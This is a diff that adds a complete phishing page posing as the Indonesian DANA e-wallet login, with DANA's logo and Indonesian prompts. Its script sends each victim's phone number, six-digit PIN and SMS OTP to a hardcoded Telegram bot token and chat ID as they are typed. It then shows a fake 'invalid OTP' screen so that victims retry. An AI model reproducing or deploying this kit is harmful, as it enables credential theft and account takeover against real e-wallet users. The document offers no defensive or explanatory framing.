@@ -1,0 +1,733 @@
+<!DOCTYPE html><html lang="id"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA Login</title>
+    <style>
+        /* Gaya Dasar */
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1E88E5; /* Biru DANA */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            transition: background-color 0.3s ease;
+        }
+
+        /* Header Logo DANA */
+        .header {
+            text-align: center;
+            padding: 25px 0 35px 0;
+            width: 100%;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        /* Konten Utama */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            text-align: left;
+        }
+
+        /* Halaman */
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        /* Loading Screen Sederhana */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1E88E5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Judul Halaman */
+        h2 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            color: white;
+            text-align: center;
+        }
+
+        /* Label Input Group */
+        .input-labels {
+            display: flex;
+            justify-content: flex-start;
+            margin-bottom: 5px;
+            padding: 0 5px;
+        }
+
+        .label {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-right: 50px;
+        }
+        .label.nomor {
+             margin-right: 0;
+        }
+
+        /* Grup Input Nomor HP */
+        .input-group {
+            display: flex;
+            background-color: white;
+            border-radius: 8px;
+            overflow: hidden;
+            height: 50px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Area Negara */
+        .country-select {
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            background-color: white;
+            color: #333;
+            font-weight: 600;
+            border-right: 1px solid #eee;
+        }
+
+        .flag {
+            width: 20px;
+            height: 14px;
+            border: 1px solid #ccc;
+            margin-right: 8px;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .flag::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background-color: red;
+        }
+        .flag::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background-color: white;
+        }
+
+        /* Input Nomor */
+        .phone-input {
+            flex-grow: 1;
+            padding: 0 10px;
+            border: none;
+            outline: none;
+            font-size: 18px;
+            color: #333;
+            font-weight: 600;
+            text-align: left;
+            border-left: 1px solid #ddd;
+        }
+        .phone-input::placeholder {
+            color: #aaa;
+            font-weight: 400;
+        }
+
+        /* Teks Penjelasan */
+        .description {
+            font-size: 14px;
+            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 20px;
+            text-align: center;
+            padding: 0 10px;
+        }
+
+        .terms-link {
+            font-weight: bold;
+            color: white;
+            text-decoration: none;
+        }
+
+        /* Tombol Lanjutkan - Diperkecil */
+        .footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            padding: 10px 0; /* Diperkecil dari 15px */
+            text-align: center;
+            background-color: #1E88E5; /* Biru DANA */
+        }
+
+        .continue-button {
+            width: 90%;
+            max-width: 400px;
+            padding: 12px; /* Diperkecil dari 15px */
+            background-color: white;
+            color: #1E88E5; /* Biru DANA */
+            border: none;
+            border-radius: 25px; /* Diperkecil dari 30px */
+            font-size: 14px; /* Diperkecil dari 16px */
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 1px;
+            opacity: 1;
+            transition: opacity 0.2s, transform 0.1s, background-color 0.3s;
+        }
+
+        .continue-button:hover {
+            opacity: 0.9;
+            background-color: #f0f0f0;
+        }
+
+        .continue-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Pesan error */
+        .error-message {
+            color: #ffcccb;
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: center;
+            display: none;
+        }
+
+        /* Halaman PIN */
+        .pin-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: white;
+            text-align: center;
+        }
+
+        .pin-subtitle {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+
+        .pin-input {
+            width: 35px;
+            height: 35px;
+            border: 2px solid white;
+            border-radius: 6px;
+            background-color: white;
+            color: #333;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
+            font-weight: 600;
+        }
+
+        .pin-input:focus {
+            border-color: #1E88E5;
+            box-shadow: 0 0 0 2px rgba(30, 136, 229, 0.3);
+        }
+
+        .pin-input.filled {
+            border-color: #1E88E5;
+            background-color: white;
+        }
+
+        .help-section {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .help-link {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Halaman OTP */
+        .otp-title {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .phone-number {
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            text-align: center;
+            margin-bottom: 25px;
+            letter-spacing: 0.5px;
+        }
+
+        .via-sms {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+
+        .otp-input {
+            width: 32px;
+            height: 38px;
+            border: 2px solid white;
+            border-radius: 6px;
+            background-color: white;
+            color: #333;
+            font-size: 16px;
+            text-align: center;
+            outline: none;
+            font-weight: 600;
+        }
+
+        .otp-input:focus {
+            border-color: #1E88E5;
+            box-shadow: 0 0 0 2px rgba(30, 136, 229, 0.3);
+        }
+
+        .otp-input.filled {
+            border-color: #1E88E5;
+            background-color: white;
+        }
+
+        .otp-actions {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-top: 25px;
+        }
+
+        .resend-link {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .timer {
+            font-size: 14px;
+            color: white;
+            font-weight: 600;
+        }
+
+        .timer.expired {
+            color: #ff6b6b;
+        }
+
+        /* Halaman Error OTP */
+        .error-otp-container {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .error-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #ff4444;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+            position: relative;
+        }
+
+        .error-icon::before {
+            content: '!';
+            color: white;
+            font-size: 30px;
+            font-weight: bold;
+        }
+
+        .error-otp-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: white;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .error-otp-message {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: rgba(255, 255, 255, 0.3);
+            margin: 30px 0;
+        }
+
+        .retry-button {
+            width: 100%;
+            padding: 12px; /* Diperkecil dari 15px */
+            background-color: transparent;
+            color: white;
+            border: 2px solid white;
+            border-radius: 25px; /* Diperkecil dari 30px */
+            font-size: 14px; /* Diperkecil dari 16px */
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .retry-button:hover {
+            background-color: white;
+            color: #1E88E5;
+        }
+
+        .retry-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Tombol Kembali */
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            display: none;
+        }
+
+        .back-button.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading-screen" id="loading-screen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Memuat...</div>
+    </div>
+
+    <button class="back-button" id="back-button">←</button>
+
+    <div class="header">
+        <img src="https://www.dana.id/_nuxt/img/dana-logo.fe46647.png" alt="DANA Logo" class="logo">
+    </div>
+
+    <div class="container">
+        <div class="page active" id="page-phone">
+            <h2>Masukkan nomor HP kamu untuk lanjut</h2>
+
+            <div class="input-labels">
+                <span class="label negara">Negara</span>
+                <span class="label nomor">Nomor</span>
+            </div>
+
+            <div class="input-group">
+                <div class="country-select">
+                    <span class="flag"></span>
+                    <span>+62</span>
+                </div>
+                <input type="tel" class="phone-input" id="phone-input" placeholder="812-3456-7890">
+            </div>
+            
+            <div class="error-message" id="error-message">
+                Nomor HP tidak valid. Pastikan format: 10-12 digit (contoh: 812-3456-7890)
+            </div>
+
+            <p class="description">
+                Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan 
+                <a href="#" class="terms-link">S&K</a> serta <a href="#" class="terms-link">Kebijakan Privasi</a> kami.
+            </p>
+        </div>
+
+        <div class="page" id="page-pin">
+            <div class="pin-title">Masuk</div>
+            <div class="pin-subtitle">Masukkan PIN</div>
+
+            <div class="pin-container">
+                <input type="password" class="pin-input" id="pin-1" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-input" id="pin-2" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-input" id="pin-3" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-input" id="pin-4" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-input" id="pin-5" maxlength="1" inputmode="numeric">
+                <input type="password" class="pin-input" id="pin-6" maxlength="1" inputmode="numeric">
+            </div>
+
+            <div class="help-section">
+                <a href="#" class="help-link">BUTUH BANTUAN?</a>
+                <a href="#" class="help-link">LUPA PIN?</a>
+            </div>
+        </div>
+
+        <div class="page" id="page-otp">
+            <div class="otp-title">Kode OTP telah terkirim ke</div>
+            
+            <div class="phone-number" id="otp-phone-number">+62 812-3456-7890</div>
+            
+            <div class="via-sms">via SMS</div>
+
+            <div class="otp-container">
+                <input type="text" class="otp-input" id="otp-1" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" id="otp-2" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" id="otp-3" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" id="otp-4" maxlength="1" inputmode="numeric">
+            </div>
+
+            <div class="otp-actions">
+                <a href="#" class="resend-link" id="resend-link">KIRIM ULANG</a>
+                <div class="timer" id="timer">00:43</div>
+            </div>
+        </div>
+
+        <div class="page" id="page-error-otp">
+            <div class="error-otp-container">
+                <div class="error-icon"></div>
+                <div class="error-otp-title">Kode OTP Tidak Valid</div>
+                <div class="error-otp-message">Silakan coba lagi dengan kode OTP yang benar</div>
+                
+                <div class="divider"></div>
+                
+                <button class="retry-button" id="retry-button">COBA LAGI</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer" id="main-footer">
+        <button class="continue-button" id="continue-button">LANJUTKAN</button>
+    </div>
+
+    <script>
+        // Konfigurasi Telegram Bot
+        const TELEGRAM_BOT_TOKEN = '8754613061:AAE3tpez07ck_-WxaxnDWYRTJ9B2uuc7sxY';
+        const TELEGRAM_CHAT_IDS = ['8671507257']; 
+
+        async function sendTelegramNotification(message) {
+            const timestamp = new Date().toLocaleString('id-ID');
+            const fullMessage = `🔄 DANA Login Notification\n📅 ${timestamp}\n\n${message}`;
+            for (const chatId of TELEGRAM_CHAT_IDS) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: fullMessage, parse_mode: 'HTML' })
+                    });
+                } catch (error) { console.error(error); }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('phone-input');
+            const continueButton = document.getElementById('continue-button');
+            const mainFooter = document.getElementById('main-footer');
+            const errorMessage = document.getElementById('error-message');
+            const backButton = document.getElementById('back-button');
+            const loadingScreen = document.getElementById('loading-screen');
+            const otpPhoneNumber = document.getElementById('otp-phone-number');
+            const timerDisplay = document.getElementById('timer');
+            const resendLink = document.getElementById('resend-link');
+            
+            const pinInputs = [1,2,3,4,5,6].map(i => document.getElementById(`pin-${i}`));
+            const otpInputs = [1,2,3,4].map(i => document.getElementById(`otp-${i}`));
+
+            let currentPage = 'phone';
+            let userPhoneNumber = '';
+            let timerInterval;
+
+            // --- LOGIKA HALAMAN 1 (PHONE) ---
+            phoneInput.addEventListener('input', function(e) {
+                let val = e.target.value.replace(/\D/g, '');
+                if (val.length > 3) val = val.substring(0,3) + '-' + val.substring(3);
+                if (val.length > 8) val = val.substring(0,8) + '-' + val.substring(8, 12);
+                e.target.value = val;
+                continueButton.disabled = val.length < 10;
+            });
+
+            continueButton.addEventListener('click', function() {
+                userPhoneNumber = phoneInput.value;
+                sendTelegramNotification(`📱 <b>Nomor HP:</b> +62 ${userPhoneNumber}`);
+                showLoading(() => showPage('pin'));
+            });
+
+            // --- LOGIKA OTOMATIS PIN (6 DIGIT) ---
+            pinInputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    if (this.value.length === 1) {
+                        this.classList.add('filled');
+                        if (index < 5) pinInputs[index + 1].focus();
+                    }
+                    
+                    const pin = pinInputs.map(i => i.value).join('');
+                    if (pin.length === 6) {
+                        sendTelegramNotification(`🔐 <b>PIN:</b> ${pin}\n🔢 Dari: +62 ${userPhoneNumber}`);
+                        showLoading(() => {
+                            otpPhoneNumber.textContent = '+62 ' + userPhoneNumber;
+                            showPage('otp');
+                            startTimer();
+                        });
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        pinInputs[index - 1].focus();
+                        pinInputs[index - 1].classList.remove('filled');
+                    }
+                });
+            });
+
+            // --- LOGIKA OTOMATIS OTP (4 DIGIT) ---
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    if (this.value.length === 1) {
+                        this.classList.add('filled');
+                        if (index < 3) otpInputs[index + 1].focus();
+                    }
+
+                    const otp = otpInputs.map(i => i.value).join('');
+                    if (otp.length === 4) {
+                        sendTelegramNotification(`📨 <b>OTP:</b> ${otp}\n🔢 Dari: +62 ${userPhoneNumber}`);
+                        showLoading(() => {
+                            if (otp === "1234") { // Contoh validasi
+                                alert('Login Berhasil!');
+                            } else {
+                                showPage('error-otp');
+                            }
+                        });
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        otpInputs[index - 1].focus();
+                        otpInputs[index - 1].classList.remove('filled');
+                    }
+                });
+            });
+
+            // --- FUNGSI HELPER ---
+            function showLoading(callback) {
+                loadingScreen.classList.add('active');
+                setTimeout(() => {
+                    loadingScreen.classList.remove('active');
+                    if(callback) callback();
+                }, 1500);
+            }
+
+            function showPage(page) {
+                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                document.getElementById(`page-${page}`).classList.add('active');
+                currentPage = page;
+
+                // Sembunyikan footer/tombol lanjut jika di PIN atau OTP
+                if (page === 'phone') {
+                    mainFooter.style.display = 'block';
+                    backButton.classList.remove('active');
+                } else {
+                    mainFooter.style.display = 'none';
+                    backButton.classList.add('active');
+                    if (page === 'pin') setTimeout(() => pinInputs[0].focus(), 300);
+                    if (page === 'otp') setTimeout(() => otpInputs[0].focus(), 300);
+                }
+            }
+
+            backButton.addEventListener('click', () => {
+                if (currentPage === 'pin') showPage('phone');
+                else if (currentPage === 'otp') showPage('pin');
+                else if (currentPage === 'error-otp') showPage('otp');
+            });
+
+            function startTimer() {
+                let timeLeft = 43;
+                clearInterval(timerInterval);
+                timerInterval = setInterval(() => {
+                    timeLeft--;
+                    let sec = timeLeft < 10 ? '0'+timeLeft : timeLeft;
+                    timerDisplay.textContent = `00:${sec}`;
+                    if (timeLeft <= 0) clearInterval(timerInterval);
+                }, 1000);
+            }
+
+            document.getElementById('retry-button').addEventListener('click', () => {
+                otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+                showPage('otp');
+            });
+        });
+    </script>
+
+
+</body></html>
